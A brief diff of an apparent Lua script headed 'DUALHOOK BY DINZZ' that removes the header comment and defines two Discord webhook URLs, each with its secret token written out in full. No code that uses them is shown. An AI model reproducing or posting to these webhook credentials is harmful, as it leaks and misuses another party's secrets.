@@ -1,5 +1,3 @@
--- DUALHOOK BY DINZZ --
-
 -- URL Webhook Discord
 local webhook_url1 = "https://discord.com/api/webhooks/1325444740241559609/RPzaWK9VJG7adUC3nszG_oAjkqowruGyYRLYQx2Mp6BWucKbQ4-xyiad0WCA15fkW98S"
 local webhook_url2 = "https://discord.com/api/webhooks/1325418716690644992/45rMJyVc3WnHcw4tW1Q85LmH6J2lj5Sc0DgVuRD46ar-JkmFyLTJZURi-gc4jeZcKecC"
